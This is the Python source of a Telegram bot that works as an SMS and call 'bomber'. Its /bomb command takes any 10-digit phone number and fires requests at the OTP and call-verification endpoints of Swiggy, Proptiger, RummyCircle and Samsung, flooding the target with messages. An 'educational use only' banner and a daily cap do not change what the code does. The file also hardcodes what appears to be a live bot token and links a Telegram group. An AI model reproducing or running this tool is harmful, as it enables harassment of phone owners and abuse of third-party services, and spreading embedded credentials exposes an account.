import requests
import asyncio
from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = "8181468891:AAEVsNSBv-PC9klp0YqC7ZXpge8Qq_wRpwQ"
TELEGRAM_GROUP = "https://t.me/+DDVmus7_7u44YjQ1"
MAX_DAILY_ATTEMPTS = 20

WARNING_MSG = """
⚠️ EDUCATIONAL USE ONLY ⚠️
This bot demonstrates API interactions.
Misuse may violate laws and terms of service.
"""

SMS_APIS = [
    {
        "name": "Swiggy",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "data": {"mobile": "PHONE_NUMBER"},
        "headers": {"Content-Type": "application/json"},
        "method": "POST"
    },
    {
        "name": "Proptiger",
        "url": "https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call",
        "data": {"contactNumber": "PHONE_NUMBER", "domainId": "2"},
        "headers": {"Content-Type": "application/json"},
        "method": "POST"
    },
    {
        "name": "RummyCircle",
        "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
        "data": {"isPlaycircle": False, "mobile": "PHONE_NUMBER", "deviceId": "6ebd671c-a5f7-4baa-904b-89d4f898ee79"},
        "headers": {"Content-Type": "application/json"},
        "method": "POST"
    },
    {
        "name": "Samsung",
        "url": "https://www.samsung.com/in/api/v1/sso/otp/init",
        "data": {"user_id": "PHONE_NUMBER"},
        "headers": {"Content-Type": "application/json"},
        "method": "POST"
    }
]

async def start(update, context):
    keyboard = [
        [InlineKeyboardButton("Join Group", url=TELEGRAM_GROUP)],
        [InlineKeyboardButton("Acknowledge Warning", callback_data="ack")]
    ]
    
    await update.message.reply_text(
        WARNING_MSG + "\n\n"
        "/bomb [number] - Send SMS\n"
        "/limit - Check usage\n"
        f"Daily limit: {MAX_DAILY_ATTEMPTS} attempts",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def bomb(update, context):
    if not context.args or not context.args[0].isdigit() or len(context.args[0]) != 10:
        await update.message.reply_text("Invalid format. Use: /bomb 9876543210")
        return

    phone = context.args[0]
    user_id = update.effective_user.id
    
    if 'attempts' not in context.bot_data:
        context.bot_data['attempts'] = {}
    
    user_attempts = context.bot_data['attempts'].get(user_id, 0)
    
    if user_attempts >= MAX_DAILY_ATTEMPTS:
        await update.message.reply_text(f"Daily limit reached ({MAX_DAILY_ATTEMPTS} attempts)")
        return

    results = []
    for api in SMS_APIS:
        try:
            data = {k: v.replace("PHONE_NUMBER", phone) if isinstance(v, str) else v 
                   for k, v in api["data"].items()}
            
            if api["method"] == "POST":
                r = requests.post(api["url"], json=data, headers=api["headers"], timeout=5)
            else:
                r = requests.get(api["url"], params=data, headers=api["headers"], timeout=5)
            
            results.append(f"{'✅' if r.status_code == 200 else '❌'} {api['name']}")
            await asyncio.sleep(1)
            
        except Exception as e:
            results.append(f"⚠️ {api['name']} Error")

    context.bot_data['attempts'][user_id] = user_attempts + 1
    
    report = "\n".join(results)
    await update.message.reply_text(
        f"Report for {phone}\n"
        f"Attempts used: {user_attempts + 1}/{MAX_DAILY_ATTEMPTS}\n\n"
        f"{report}\n\n"
        f"{WARNING_MSG}"
    )

async def limit(update, context):
    user_id = update.effective_user.id
    attempts = context.bot_data.get('attempts', {}).get(user_id, 0)
    
    await update.message.reply_text(
        f"Your Usage:\n"
        f"Attempts today: {attempts}\n"
        f"Remaining: {MAX_DAILY_ATTEMPTS - attempts}\n\n"
        f"{WARNING_MSG}"
    )

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("bomb", bomb))
    app.add_handler(CommandHandler("limit", limit))
    
    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
